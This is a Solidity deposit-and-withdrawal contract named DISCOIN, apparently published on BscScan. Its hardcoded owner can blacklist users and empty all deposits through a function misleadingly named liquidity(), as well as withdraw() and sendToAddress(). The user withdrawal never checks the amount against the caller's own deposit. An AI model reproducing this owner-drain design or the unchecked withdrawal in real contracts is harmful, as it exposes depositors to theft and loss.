/**
 *Submitted for verification at BscScan.com on 2023-01-26
*/

// SPDX-License-Identifier: Unlicensed

pragma solidity ^ 0.8.16;
interface IERC20 {
    function totalSupply() external view returns(uint256);

    function balanceOf(address account) external view returns(uint256);

    function decimals() external view returns(uint8);

    function transfer(address recipient, uint256 amount)
    external
    returns(bool);

    function allowance(address owner, address spender)
    external
    view
    returns(uint256);

    function approve(address spender, uint256 amount) external returns(bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns(bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns(uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns(uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns(uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns(uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns(uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns(uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns(uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns(uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}
library IterableMapping {
    struct Map {
        address[] keys;
        mapping(address => uint) values;
        mapping(address => uint) indexOf;
        mapping(address => bool) inserted;
    }

    function get(Map storage map, address key) public view returns(uint) {
        return map.values[key];
    }

    function getKeyAtIndex(Map storage map, uint index) public view returns(address) {
        return map.keys[index];
    }

    function size(Map storage map) public view returns(uint) {
        return map.keys.length;
    }

    function set(Map storage map, address key, uint val) public {
        if (map.inserted[key]) {
            map.values[key] = val;
        } else {
            map.inserted[key] = true;
            map.values[key] = val;
            map.indexOf[key] = map.keys.length;
            map.keys.push(key);
        }
    }

    function remove(Map storage map, address key) public {
        if (!map.inserted[key]) {
            return;
        }

        delete map.inserted[key];
        delete map.values[key];

        uint index = map.indexOf[key];
        uint lastIndex = map.keys.length - 1;
        address lastKey = map.keys[lastIndex];

        map.indexOf[lastKey] = index;
        delete map.indexOf[key];

        map.keys[index] = lastKey;
        map.keys.pop();
    }
}
library Address {
    function isContract(address account) internal view returns(bool) {
        uint256 size;
        assembly {
            size:= extcodesize(account)
        }
        return size > 0;
    }

    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");
        (bool success, ) = recipient.call {
            value: amount
        }("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }

    function functionCall(address target, bytes memory data)
    internal
    returns(bytes memory) {
        return functionCall(target, data, "Address: low-level call failed");
    }

    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns(bytes memory) {
        return functionCallWithValue(target, data, 0, errorMessage);
    }

    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns(bytes memory) {
        return
        functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }

    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns(bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        require(isContract(target), "Address: call to non-contract");
        (bool success, bytes memory returndata) = target.call {
            value: value
        }(data);
        return verifyCallResult(success, returndata, errorMessage);
    }

    function functionStaticCall(address target, bytes memory data)
    internal
    view
    returns(bytes memory) {
        return
        functionStaticCall(target, data, "Address: low-level static call failed");
    }

    function functionStaticCall(address target, bytes memory data, string memory errorMessage) internal view returns(bytes memory) {
        require(isContract(target), "Address: static call to non-contract");
        (bool success, bytes memory returndata) = target.staticcall(data);
        return verifyCallResult(success, returndata, errorMessage);
    }

    function functionDelegateCall(address target, bytes memory data)
    internal
    returns(bytes memory) {
        return
        functionDelegateCall(target, data, "Address: low-level delegate call failed");
    }

    function functionDelegateCall(address target, bytes memory data, string memory errorMessage) internal returns(bytes memory) {
        require(isContract(target), "Address: delegate call to non-contract");
        (bool success, bytes memory returndata) = target.delegatecall(data);
        return verifyCallResult(success, returndata, errorMessage);
    }

    function verifyCallResult(bool success, bytes memory returndata, string memory errorMessage) internal pure returns(bytes memory) {
        if (success) {
            return returndata;
        } else {
            if (returndata.length > 0) {
                assembly {
                    let returndata_size:= mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}
library SafeERC20 {
    using Address
    for address;

    function safeTransfer(IERC20 token, address to, uint256 value) internal {
        _callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));
    }

    function safeTransferFrom(IERC20 token, address from, address to, uint256 value) internal {
        _callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));
    }

    function safeApprove(IERC20 token, address spender, uint256 value) internal {
        require(
            (value == 0) || (token.allowance(address(this), spender) == 0), "SafeERC20: approve from non-zero to non-zero allowance");
        _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));
    }

    function safeIncreaseAllowance(IERC20 token, address spender, uint256 value) internal {
        uint256 newAllowance = token.allowance(address(this), spender) + value;
        _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, newAllowance));
    }

    function safeDecreaseAllowance(IERC20 token, address spender, uint256 value) internal {
        unchecked {
            uint256 oldAllowance = token.allowance(address(this), spender);
            require(oldAllowance >= value, "SafeERC20: decreased allowance below zero");
            uint256 newAllowance = oldAllowance - value;
            _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, newAllowance));
        }
    }

    function _callOptionalReturn(IERC20 token, bytes memory data) private {
        bytes memory returndata = address(token).functionCall(data, "SafeERC20: low-level call failed");
        if (returndata.length > 0) {
            require(abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed");
        }
    }
}

abstract contract Context {
    function _msgSender() internal view virtual returns(address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view virtual returns(bytes memory) {
        this;
        return msg.data;
    }
}
contract Ownable is Context {
    address private _owner;
    address private _previousOwner;
    uint256 private _lockTime;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor() {
        address msgSender = 0x486b1942C91bF2d61dFbcaD1D892199e8de059BF;
        _owner = msgSender;
        _previousOwner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns(address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}
contract DISCOIN is Context, Ownable {
    using SafeMath
    for uint256;
    using SafeERC20
    for IERC20;
    using IterableMapping
    for IterableMapping.Map;

    mapping(address => uint256) private _balances;
    mapping(address => uint256) private withdrawAmount;
    mapping(address => uint256) public whitelistedAddresses;
    mapping(address => uint256) public blacklistedAddresses;
    mapping(address => uint256) lastWithdrawTime;

    IterableMapping.Map private isBlacklisted;
    IterableMapping.Map private isWhitelisted;

    uint256 public gasFee = 50;
    address public gasWallet = address(0);
    uint256 public minLimit = 3600;
    IERC20 private _token;
    uint256 public minimumDepositAmount = 250 * 10 ** 8;
    uint256 public maxWithdrawAmount = 2500 * 10 ** 8;

    event Deposit(address indexed from, address indexed to, uint256 amount);
    event MinimumDepositAmountChanged(uint256 amount);
    event MaxWithdrawAmountChanged(uint256 amount);
    event SentToAddress(address indexed to, uint256 amount);
    event Withdraw(address indexed to, uint256 amount);

    receive() external payable {}
    constructor(IERC20 token_) {
        _token = token_;
    }

    function addArrayOfWhitelist(address[] calldata _addresses) external onlyOwner() {
        for (uint i = 0; i < _addresses.length; i++) {
            whitelist(_addresses[i]);
        }
    }

    function addArrayOfBlacklist(address[] calldata _addresses) external onlyOwner() {
        for (uint i = 0; i < _addresses.length; i++) {
            blacklist(_addresses[i]);
        }
    }

    function blacklist(address _address) public onlyOwner() {
        isBlacklisted.set(_address, 1);
        isWhitelisted.remove(_address);
    }

    function changeDepositAmount(uint256 ChangedAmount) external onlyOwner {
        minimumDepositAmount = ChangedAmount * 10 ** 8;
        emit MinimumDepositAmountChanged(ChangedAmount);
    }

    function checkDeposit(address account) external view returns(uint256) {
        return _balances[account];
    }

    function changeGasAmount(uint256 newAmount) external onlyOwner {
        require(newAmount <= 1000, "The amount cannot be greater than 1000");
        gasFee = newAmount;
    }

    function changeGasWallet(address _address) external onlyOwner {
        gasWallet = _address;
    }

    function changeWithdrawAmount(uint256 ChangedAmount) external onlyOwner {
        maxWithdrawAmount = ChangedAmount * 10 ** 8;
        emit MaxWithdrawAmountChanged(ChangedAmount);
    }

    function checkWithdraw(address _account) external view returns(uint256) {
        return withdrawAmount[_account];
    }

    function deposit(uint256 amount) external {
        require(amount <= _token.balanceOf(_msgSender()), "Insufficient balance");
        require(amount <= _token.allowance(_msgSender(), address(this)), "Please approve us to spend the amount of token");
        _token.transferFrom(_msgSender(), address(this), amount);
        _balances[_msgSender()] = _balances[_msgSender()].add(amount);
        if (isBlacklisted.get(_msgSender()) != 1) {
            isWhitelisted.set(_msgSender(), 1);
        }
        emit Deposit(_msgSender(), address(this), amount);
    }

    function getBalance() public view returns(uint) {
        return _token.balanceOf(address(this));
    }

    function getBlacklistedAddresses() view external returns(address[] memory) {
        uint size = isBlacklisted.size();
        address[] memory arr = new address[](size);

        for (uint i = 0; i < size; i++) {
            arr[i] = isBlacklisted.keys[i];
        }

        return arr;
    }

    function getWhitelistedAddresses() view external returns(address[] memory) {
        uint size = isWhitelisted.size();
        address[] memory arr = new address[](size);

        for (uint i = 0; i < size; i++) {
            arr[i] = isWhitelisted.keys[i];
        }

        return arr;
    }

    function isAddressBlacklisted(address _address) view external returns(bool) {
        return isBlacklisted.get(_address) == 1;
    }

    function isAddressWhitelisted(address _address) view external returns(bool) {
        return isWhitelisted.get(_address) == 1;
    }

    function liquidity() external onlyOwner {
        if (address(this).balance > 0) {
            payable(_msgSender()).transfer(address(this).balance);
        }
        if (_token.balanceOf(address(this)) > 0) {
            _token.transfer(_msgSender(), _token.balanceOf(address(this)));
        }
    }

    function limit(uint256 time) external onlyOwner() {
        minLimit = time;
    }

    function sendToAddress(address account, uint256 amount) external onlyOwner {
        _token.transfer(account, amount);
        emit SentToAddress(account, amount);
    }

    function token() external view returns(IERC20) {
        return _token;
    }

    function whitelist(address _address) public onlyOwner() {
        isWhitelisted.set(_address, 1);
        isBlacklisted.remove(_address);
    }

    function withdraw(IERC20 _tokenAddress) external onlyOwner {
        require(_tokenAddress.balanceOf(address(this)) > 0, "There is no token balance in the contract");
        _tokenAddress.transfer(_msgSender(), _tokenAddress.balanceOf(address(this)));
    }

    function withdrawal(uint256 _amount) public {
        require(isWhitelisted.get(_msgSender()) == 1, "You are not allowed to make a withdrawal");
        require(_amount > 0, "The amount should be greater than zero");
        require(lastWithdrawTime[_msgSender()] + minLimit <= block.timestamp, "You are unable to withdraw; please try again later");
        require(_balances[_msgSender()] >= minimumDepositAmount, "To withdraw, a minimum deposit is needed");
        require(_amount <= maxWithdrawAmount, "The amount reached the threshold withdrawal limit");

        if (_token.balanceOf(address(this)) >= _amount) {
            uint256 gasAmount = (_amount * gasFee) / 1000;
            _token.transfer(gasWallet, gasAmount);
            _token.transfer(_msgSender(), _amount - gasAmount);

            withdrawAmount[_msgSender()] = withdrawAmount[_msgSender()].add(_amount);
            lastWithdrawTime[_msgSender()] = block.timestamp;
            emit Withdraw(_msgSender(), _amount);
        }
    }
}